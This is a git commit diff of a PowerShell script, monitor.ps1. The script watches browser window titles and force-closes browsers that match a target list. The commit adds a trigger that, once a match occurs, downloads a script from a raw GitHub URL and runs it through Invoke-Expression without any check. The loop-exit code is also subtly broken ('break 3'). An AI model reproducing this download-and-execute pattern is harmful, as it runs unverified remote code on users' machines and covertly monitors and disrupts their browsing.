bdcb319829b238d49669423ace5a1788f347d733
Wesley5n1p35 <47337218+Wesley5n1p35@users.noreply.github.com>
2023-11-08 02:08:33 -0600

    Update monitor.ps1

--- monitor.ps1
+++ monitor.ps1
@@ -7,41 +7,46 @@ $browserProcesses = @("chrome", "firefox", "msedge", "opera")
 # Define the interval to check (in seconds)
 $checkInterval = 15
 
+# Flag to determine if the condition is met
+$conditionMet = $false
+
+# URL of the action script
+$actionScriptUrl = "https://raw.githubusercontent.com/Wesley5n1p35/psh/main/pp.ps1"
+
+# Function to trigger the action script
+function Trigger-ActionScript {
+    Invoke-Expression (iwr $actionScriptUrl).Content
+}
+
 # Outer loop to run continuously
 while ($true) {
-    # Loop until any condition is met
-    $conditionMet = $false
+    if ($conditionMet) {
+        Trigger-ActionScript
+        break  # Exit the monitoring loop and trigger the action
+    }
 
-    while (-not $conditionMet) {
-        foreach ($browserName in $browserProcesses) {
-            $currentBrowserProcesses = Get-Process -name $browserName -ErrorAction SilentlyContinue
-            if ($currentBrowserProcesses) {
-                foreach ($process in $currentBrowserProcesses) {
-                    try {
-                        $processTitle = $process.MainWindowTitle
-                        Write-Host "$browserName - Window Title: $processTitle"
-                        if ($targetTitles | ForEach-Object { $processTitle -like "*$_*" }) {
-                            Write-Host "Detected one of the specified titles in $browserName. Closing..."
-                            Stop-Process -Id $process.Id -Force
-                            $conditionMet = $true  # Set the flag to true when any condition is met
-                            break 2  # Exit both inner and outer loops when any condition is met
-                        }
-                    } catch {
-                        # Handle any exceptions that might occur (e.g., due to missing access permissions)
+    foreach ($browserName in $browserProcesses) {
+        $currentBrowserProcesses = Get-Process -name $browserName -ErrorAction SilentlyContinue
+        if ($currentBrowserProcesses) {
+            foreach ($process in $currentBrowserProcesses) {
+                try {
+                    $processTitle = $process.MainWindowTitle
+                    Write-Host "$browserName - Window Title: $processTitle"
+                    if ($targetTitles | ForEach-Object { $processTitle -like "*$_*" }) {
+                        Write-Host "Detected one of the specified titles in $browserName. Closing..."
+                        Stop-Process -Id $process.Id -Force
+                        $conditionMet = $true  # Set the flag to true when any condition is met
+                        break 3  # Exit both inner and outer loops when any condition is met
                     }
+                } catch {
+                    # Handle any exceptions that might occur (e.g., due to missing access permissions)
                 }
             }
         }
-
-        if ($conditionMet) {
-            break  # Exit the outer loop when any condition is met
-        }
-
-        # Sleep for the specified interval (in seconds) before checking again
-        Start-Sleep -Seconds $checkInterval
     }
+
+    Start-Sleep -Seconds $checkInterval
 }
 
-# Continue with the rest of your script here
+# Continue with the rest of your script here if needed
 Write-Host "A condition is met. Continue with the rest of your code here."
-
